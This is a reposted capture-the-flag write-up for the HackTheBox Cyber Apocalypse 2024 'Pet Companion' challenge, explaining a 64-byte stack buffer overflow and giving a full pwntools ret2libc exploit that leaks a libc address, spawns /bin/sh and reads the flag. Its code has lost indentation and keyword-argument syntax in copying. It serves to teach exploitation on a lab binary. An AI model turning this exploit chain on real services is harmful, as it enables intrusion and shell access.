# :game_die: HTB: Cyber Apocalypse 2024 — Pet Companion

> **Original Source:** [HTB: Cyber Apocalypse 2024 — Pet Companion](https://infosecwriteups.com/htb-cyber-apocalypse-2024-pet-companion-b9c289efc448)
> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2024

---

# HTB: Cyber Apocalypse 2024 — Pet Companion


Difficulty: Easy


### Description


Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet’s demeanor — whether happy, angry, sad, or funny — to enhance your bond on this perilous adventure.

### Protection (checksec)


```
$ checksec
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'./glibc/'
```


### Disassembly (ghidra)


*64 bytes buffer (256 bytes is read)*


We can notice in the read method that we read 256 data, but the buffer is 64 bytes long.

*libc functions available in PLT (Procedure Linkage Table)*


## Get Szigecsán Dávid’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in

### Exploitation


- Overflows the buffer (64 bytes + 8 bytes for saved RBP)

- Uses Return-Oriented Programming (ROP) to call write with the address of read or write function from libc

- Calculate libc base address

- Call system(‘/bin/sh’)

### Solution (pwntools)


```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './pet_companion')

context.log_level = "INFO"
context(terminal=['tmux', 'split-window', '-h'])

host = args.HOST or '83.136.254.189'
port = int(args.PORT or 49069)


def start_local(argv=[], *a, kw):
if args.GDB:
return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
else:
return process([exe.path] + argv, *a, kw)


def start_remote(argv=[], *a, kw):
io = connect(host, port)
if args.GDB:
gdb.attach(io, gdbscript=gdbscript)
return io


def start(argv=[], *a, kw):
if args.REMOTE:
return start_remote(argv, *a, kw)
else:
return start_local(argv, *a, kw)

gdbscript = '''
init-gef
continue
'''.format(locals())

#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x400000)
# RUNPATH: b'./glibc/'
# Stripped: No

io = start()

rop = ROP(exe)
rop.write(1, exe.got['write'])
rop.main()
io.sendline(b'A' * 64 + b'B' * 8 + rop.chain())
io.recvuntil(b'Configuring...\n\n')
write_leek = u64(io.recv(6).ljust(8, b'\x00'))
info(f'{hex(write_leek)=}')

libc = ELF('./glibc/libc.so.6', checksec=False)
libc.address = write_leek - libc.symbols['write']
libc_rop = ROP(libc)
libc_rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(b'A' * 64 + b'B' * 8 + libc_rop.chain())

io.clean()
io.sendline(b'cat flag.txt')
warning('Flag: ' + io.recv().decode('utf-8'))

io.interactive()
```


### Skills Learned


- buffer overflow

- ret2libc

- ROP (Return-Oriented Programming)

- GOT (Global Offset Table)

- PLT (Procedure Linkage Table)

---

*Originally published on [Medium](https://infosecwriteups.com/htb-cyber-apocalypse-2024-pet-companion-b9c289efc448). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
